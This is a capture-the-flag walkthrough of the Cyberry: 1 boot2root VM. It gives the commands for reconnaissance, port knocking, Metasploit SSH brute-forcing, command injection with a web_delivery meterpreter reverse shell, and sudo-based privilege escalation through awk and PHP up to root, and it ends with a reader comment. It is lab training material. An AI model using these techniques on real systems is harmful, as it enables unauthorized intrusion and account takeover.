@@ -1,0 +1,236 @@
+
+								
+																		Hack the  Cyberry: 1 VM( Boot2Root Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on January 21, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as Cyberry: 1. the credit for making this vm machine goes to “Cyberry” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.0.18 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -sV 192.168.0.18
+
+Nmap scan shows us port 80 is open, so we open ip address in our browser.
+
+We don’t find anything on the webpage we use nikto to find more information.
+nikto -h http://192.168.0.18
+
+Nikto scan shows us the login page. We open http://192.168.0.18/login.html on our browser.
+
+We don’t find anything on the login page but a link to the main site http://192.168.0.18/berrypedia.html.
+
+While going through the links on the page. I found an image called placeho1der.jpg
+
+We convert it from negative image into normal image. And we find it was a picture of 4 artists Smiley Lewis, Dave Edmunds, Fats Domino and Gale Storm.
+
+On further research I found that they all sang the same song “I hear you knocking”. From the name of the song and the port image, I concluded it had something to do with port knocking. So I used the release date of the song as the port.
+knock 192.168.0.18 1970 1955 1955 1961
+
+After port knocking we did a nmap scan to check if any port is open and we find that port 61955 opened after port knocking
+nmap -p- 192.168.0.18
+
+We try netcat but are showed nothing so we open it in our browser; we find that it is running the same website on a different port.
+
+We use dirb to check if there are any different directories on this port.
+dirb http://192.168.0.18:61955
+
+We find a new directory http://192.168.0.18:61955/H, we open it and find brain-fuck encoded strings.
+
+We use an online tool to decode the string 1 by 1 and we found a list of username and password. We save the username in one text file and the password in another.
+
+Now we try to brute force ssh using these credentials. We use metasploit to brute force ssh.
+msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) &gt; set rhosts 192.168.0.18
+msf auxiliary(ssh_login) &gt; set user_file /root/user.txt
+msf auxiliary(ssh_login) &gt; set pass_file /root/pass.txt
+msf auxiliary(ssh_login) &gt; run
+
+We find that the username is mary and password is bakeoff, but we cannot connect through ssh using these credentials. So we use these to login through ftp.
+ftp 192.168.0.18
+
+After login through ftp we go inside .bash_history directory there we find 2 files.
+
+We download it into our system and rename them.
+get .reminder.enc /root/reminder
+get .trash /root/trash
+
+We check the file type and find that reminder is encrypted and trash contains password to decrypt it.
+file reminder
+file trash
+cat trash
+
+Now we use openssl to decrypt it. We create shell code to decrypt it as there are multiple passwords to be used and multiple types of encryption. We save it in files with name format as decrypted{encryption}{password}.
+for i in ‘openssl enc -ciphers | tail -n +2’ ; do for j in ‘cat trash’; do openssl ${i:1} -d -salt -md md5 -in reminder -out “decrypted$i$j” -k $j; done;done 2&gt;/dev/null
+
+Now we check the decrypted files which contain ascii text.
+file * | grep ASCII
+
+We open the file that contains ASCII text and find it contains a password.
+
+We use this password to login at http://192.168.0.18:61955/login.php. We use the username we used earlier to brute force ssh and find the username to be mary.
+Now once we login we find a link to page.
+
+When we open the link we find a page that does DNS lookup, it looks like it may be vulnerable to command injection.
+
+Now we metasploit to exploit command injection using web_delivery.
+msf &gt; use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.0.12
+msf exploit(multi/script/web_delivery) &gt; set lport 4444
+msf exploit(multi/script/web_delivery) &gt; run
+
+We use burpsuite to capture the request and execute the command given by metasploit to execute our shell.
+
+Now we use generate a python tty shell.
+python -c “import pty; pty.spawn(‘/bin/bash’)”
+we find a few files, when we open nb-latin we find it contains a few password.
+
+We download the ‘nb-latin’ file to use it to bruteforce ssh using the username we found earlier.
+
+We use metasploit to bruteforce ssh using the new password file we found.
+msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.0.18
+msf auxiliary(scanner/ssh/ssh_login) &gt; set user_file user.txt
+msf auxiliary(scanner/ssh/ssh_login) &gt; set pass_file nb-latin
+msf auxiliary(scanner/ssh/ssh_login) &gt; run
+
+We find the password to be custodio for nick. Now once we login through ssh we check the sudoers list and there are 2 files we can a user terry.
+
+When we run invoke.sh we find it asks for program as arguments. So we try to run /bin/bash along with the shell script.
+sudo -u terry /home/nick/invoke.sh /bin/bash
+
+Now we are login as terry, we again check the sudoers list. We find that we can run awk as user halle. So we spawn a shell using awk as user halle.
+sudo -u halle awk ‘BEGIN {system(“/bin/bash -I”)}’
+
+As soon as we spawn a shell we login as halle. We again check sudoers list and find we can run php as user chuck. When we spawn a tty shell using chuck it crashes. So we create a php file to enumerate directories. We find a directory called .deleted/
+echo &lt;?php(‘ls /home/chuck/’)?&gt;” &gt; /tmp/shell.php
+sudo -u chuck php /tmp/shell.php
+
+When we go inside .deleted folder we find a file deleted.
+echo &lt;?php(‘ls /home/chuck/.deleted/’)?&gt;” &gt; /tmp/shell.php
+sudo -u chuck php /tmp/shell.php
+
+Now we create a php file to open the file called deleted.
+echo &lt;?php(‘cat /home/chuck/.deleted/deleted’)?&gt;” &gt; /tmp/shell.php
+sudo -u chuck php /tmp/shell.php
+
+Once we open the file we get a hint to create a password in which ‘e’ is used thrice, [c,r,b,a] are used twice and [h,w,m,y] are used once that makes the password 15 characters long. Also the password starts with che and ends with rry and contains baca in between.
+
+We use crunch to create dictionaries with che at start and rry at end with baca at different positions.
+
+We then merge the all dictionaries into one using dymerge.
+
+We add root to the dictionary we used first to brute-force ssh.
+
+Now we use metasploit to bruteforce ssh using the the new dictionaries.
+msf &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.0.18
+msf auxiliary(scanner/ssh/ssh_login) &gt; set user_file user.txt
+msf auxiliary(scanner/ssh/ssh_login) &gt; set pass_file password.txt
+msf auxiliary(scanner/ssh/ssh_login) &gt; run 
+
+Now we find the username as ‘root’ and password to be ‘chewbacabemerry’. Now we take the session and we are login as root.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								kiyori March 11, 2018 at 2:44 am							
+							
+							
+														
+							
+								How long did it take you to bruteforce the root password to chewbacabemerry?  I see that you did it through msfconsole, but mine runs sloooowwwwww
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
